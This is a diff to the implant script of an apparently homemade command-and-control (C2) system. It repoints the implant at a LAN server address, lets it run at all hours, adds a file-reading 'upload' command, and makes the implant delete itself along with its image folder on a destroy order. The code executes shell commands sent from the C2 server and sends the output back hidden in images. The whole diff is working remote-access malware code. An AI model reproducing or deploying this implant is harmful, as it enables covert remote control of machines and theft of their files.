@@ -17,7 +17,7 @@ RESET = '\033[0m'
 
 global_key = None
 
-url = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.
+url = "http://192.168.20.9:80/" #remember to change this to the actual IP address of machine running the C2 Server.
 
 routes = {
     0 : url + "feed.com", #task
@@ -28,9 +28,10 @@ routes = {
 
 def check_interval(): #check_interval
     curr_time = datetime.now().hour
-    if curr_time >= 20 and curr_time <= 24: #2 - 10 for Moscow business hours
-        return 
+    if curr_time >= 0 and curr_time <= 24: #2 - 10 for Moscow business hours
+        return True
     print(f"{RED}[!]{RESET} Nyet.")
+    return False
     time.sleep(60)
 
 #Encryption of data -- IV is concatenated at the end of message for decryption
@@ -77,13 +78,15 @@ def exec(cmd): #exec
             destroy()
         elif cmd_lst[0] == "upload": 
             print(f"[+] Reading {cmd_lst[1]}")
-            pass #needs to be implemented
+            output = subprocess.run(["cat", cmd_lst[1]], capture_output=True, text=True)
+            result = output.stdout
+            #pass #needs to be implemented
         else: 
             print(f"{GREEN}[+]{RESET} Executing command: %s" % cmd)
             output = subprocess.run(cmd_lst, capture_output=True, text=True)
             result = output.stdout 
             print(f"{GREEN}[+]{RESET} Result: %s" % result)
-    return result 
+    return result[:4000] 
 
 #Sending output back to C2Server 
 def send_output(obf_img): #send_output
@@ -94,7 +97,9 @@ def send_output(obf_img): #send_output
 #Called to clean up and destroy implant
 def destroy(): #destroy
     implant_location=os.path.abspath(__file__)
-    subprocess.Popen(f"rm -f '{{file_path}}'",shell=True)
+    #subprocess.Popen(f"rm -f '{{file_path}}'",shell=True)
+    subprocess.Popen(f"rm -rf images",shell=True)
+    subprocess.Popen(f"rm -f '{implant_location}'",shell=True)
     sys.exit(0)
     pass
 
@@ -155,7 +160,8 @@ if __name__ == '__main__': #main
 
     num_tries = 1
     while True: 
-        check_interval()
+        if not check_interval():
+            continue
         try: 
             #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
             #comment out encrypt and decrypt functions to test overall functionality (they won't work since IV is not shared between server and client yet.)
